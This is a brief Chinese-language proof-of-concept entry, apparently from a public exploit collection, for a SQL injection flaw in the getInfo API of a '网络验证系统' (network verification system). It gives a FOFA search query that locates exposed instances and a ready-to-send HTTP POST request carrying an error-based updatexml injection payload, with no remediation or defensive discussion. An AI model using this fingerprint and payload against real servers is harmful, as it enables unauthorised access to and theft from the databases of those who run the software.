## 网络验证系统getInfo参数存在SQL注入漏洞


## fofa
```
body="zhuya/js/base.js"
```

![image](https://github.com/wy876/POC/assets/139549762/fc89004e-3d6d-43b5-9d00-628468cb3d7a)

## poc
```
POST /index.php/api/Software/getInfo HTTP/1.1
Host: 
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

data=123456&id=1 and updatexml(1,concat(0x7e,md5(123),0x7e),1)
```


![image](https://github.com/wy876/POC/assets/139549762/c0c54626-76ac-440a-97be-760bb17c61cb)
